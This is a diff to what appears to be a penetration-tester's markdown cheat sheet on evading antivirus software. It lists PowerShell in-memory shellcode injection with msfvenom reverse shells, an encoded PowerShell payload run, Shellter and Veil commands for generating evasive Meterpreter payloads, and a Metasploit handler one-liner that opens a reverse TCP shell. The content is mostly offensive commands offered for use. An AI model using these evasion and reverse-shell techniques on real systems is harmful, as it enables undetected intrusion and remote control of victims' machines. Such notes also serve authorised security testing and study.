@@ -26,7 +26,8 @@ sudo apt install upx-ucl
 
 ## Powershell AV ByPass Techiques
 
-* Use Powershell x86 Script
+* **Limitation**: Powershell x86
+* Use Powershell x86 Template Script
 * Implant Reverse-Shell with In-Memory-Injection (VirtualAlloc, memset, CreateThread)
   * Use Msfvenom to create a reverse shell -f powershell
   * Add Shellcode `<place your shellcode here>`
@@ -78,4 +79,30 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ./av-bypass-resershell.ps1
 # Alternative base64 encode ps1
 powershell -enc  JABjAG8AZABlACAAPQAgACcACgBbAEQAbABsAEkAbQBwAG8...
+```
+
+## Automate AV Evasion with Shellter x86
+
+* **Limitation**: Require x86, 32bit windows only
+* Windows Tool Download `https://www.shellterproject.com/download/
+* Use Meterpreter Reverse Shell Handler
+
+
+```bash
+# Kali
+sudo apt install shellter
+```
+
+```bash
+# Meterpreter 
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+meterpreter > shell
+```
+
+## Automate AV Evasion with Veil Framework
+
+* **Limitation**: Require x86
+
+```bash
+$ vail -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
 ```
